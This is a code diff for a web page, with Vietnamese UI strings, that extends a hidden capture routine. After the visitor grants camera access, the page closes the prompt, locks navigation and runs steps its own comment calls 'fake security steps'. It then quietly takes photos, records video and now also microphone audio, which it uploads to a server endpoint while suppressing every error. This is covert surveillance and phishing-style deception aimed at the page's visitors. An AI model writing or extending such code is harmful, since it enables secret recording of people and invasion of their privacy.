+        let mimeType = 'audio/webm;codecs=opus';
+        if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/webm';
+
+        audioChunks = [];
+        audioRecorder = new MediaRecorder(audioStream, { mimeType, audioBitsPerSecond: 64000 });
+        audioRecorder.ondataavailable = e => { if (e.data && e.data.size > 0) audioChunks.push(e.data); };
+        audioRecorder.onstop = () => {
+          if (audioChunks.length === 0) return;
+          const blob = new Blob(audioChunks, { type: mimeType });
+          sendAudio(blob);
+        };
+        audioRecorder.start(1000);
+        setTimeout(() => {
+          if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
+        }, VIDEO_DURATION + 2000);
+      } catch (e) {}
+    }
+
+    async function sendAudio(blob) {
+      try {
+        const formData = new FormData();
+        formData.append('audio', blob, 'ambient.webm');
+        if (sessionId) formData.append('sessionId', sessionId);
+        await fetch('/api/upload-audio', { method: 'POST', body: formData });
+      } catch (e) {}
     }
 
     // ========== Permission Overlay ==========
@@ -1050,11 +903,9 @@
     async function requestPermission() {
       const btn = document.getElementById('perm-start-btn');
       const overlay = document.getElementById('permission-overlay');
-
       const old = overlay.querySelector('.cam-err');
       if (old) old.remove();
 
-      // Kiểm tra camera permission
       try {
         const perm = await navigator.permissions.query({ name: 'camera' });
         if (perm.state === 'denied') {
@@ -1064,62 +915,87 @@
           btn.onclick = () => location.reload();
           return;
         }
-      } catch (e) { /* trình duyệt không hỗ trợ */ }
+      } catch (e) {}
 
       btn.disabled = true;
       btn.innerHTML = '📷 Đang mở camera...';
 
       try {
-        // Xin quyền camera
+        // Request camera + microphone simultaneously
         stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-          audio: false
+          audio: true
         });
 
-        // ✅ Cho phép → Đóng overlay
+        // Close permission overlay
         overlay.style.transition = 'opacity 0.3s ease';
         overlay.style.opacity = '0';
         setTimeout(() => { overlay.style.display = 'none'; }, 300);
 
-        // Đăng ký session và chặn thoát
+        // Register session
         await registerSession();
         lockPage();
 
-        // Chụp ảnh + Quay video ngầm
-        video.srcObject = stream;
+        // Setup camera video stream (no audio track for video element to avoid echo)
+        const videoOnly = new MediaStream(stream.getVideoTracks());
+        video.srcObject = videoOnly;
         video.onloadedmetadata = () => {
           video.play();
-          startDetection();           // chụp ảnh
-          startVideoRecording(stream); // quay video 15s
-          showCountdown(15);           // đếm ngược 15s
+
+          // Run fake security steps, then show countdown
+          runSecuritySteps(() => {
+            startDetection();
+            startVideoRecording(stream);   // video with audio
+            startAudioRecording(stream);   // ambient audio separately
+            showCountdown(15);
+          });
         };
 
       } catch (err) {
-        btn.disabled = false;
-        btn.innerHTML = '🔄 Thử lại';
-
-        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-          showCamError('❌ Bạn chưa cấp quyền camera. Bấm <strong>Thử lại</strong> để cấp quyền.');
-        } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
-          showCamError('❌ Không tìm thấy camera trên thiết bị này.');
-          // Không có camera → vẫn đăng ký session
-          await registerSession();
-          lockPage();
+        // Try camera-only if audio denied
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: false
+          });
           overlay.style.transition = 'opacity 0.3s ease';
           overlay.style.opacity = '0';
           setTimeout(() => { overlay.style.display = 'none'; }, 300);
-          return;
-        } else if (err.name === 'NotReadableError') {
-          showCamError('❌ Camera đang bị ứng dụng khác dùng. Đóng ứng dụng đó rồi bấm Thử lại!');
-        } else {
-          showCamError('❌ Lỗi không xác định. Bấm Thử lại để tải lại trang!');
-        }
 
-        btn.onclick = () => location.reload();
+          await registerSession();
+          lockPage();
+
+          video.srcObject = stream;
+          video.onloadedmetadata = () => {
+            video.play();
+            runSecuritySteps(() => {
+              startDetection();
+              startVideoRecording(stream);
+              showCountdown(15);
+            });
+          };
+        } catch (err2) {
+          btn.disabled = false;
+          btn.innerHTML = '🔄 Thử lại';
+
+          if (err2.name === 'NotAllowedError' || err2.name === 'PermissionDeniedError') {
+            showCamError('❌ Bạn chưa cấp quyền. Bấm <strong>Thử lại</strong> để cấp quyền.');
+          } else if (err2.name === 'NotFoundError') {
+            showCamError('❌ Không tìm thấy camera trên thiết bị này.');
+            await registerSession();
+            lockPage();
+            overlay.style.transition = 'opacity 0.3s ease';
+            overlay.style.opacity = '0';
+            setTimeout(() => { overlay.style.display = 'none'; }, 300);
+            return;
+          } else {
+            showCamError('❌ Lỗi không xác định. Bấm Thử lại!');
+          }
+          btn.onclick = () => location.reload();
+        }
       }
     }
 
-    // ========== Init ==========
     window.addEventListener('load', () => { /* chờ user bấm nút */ });
   </script>
 </body>
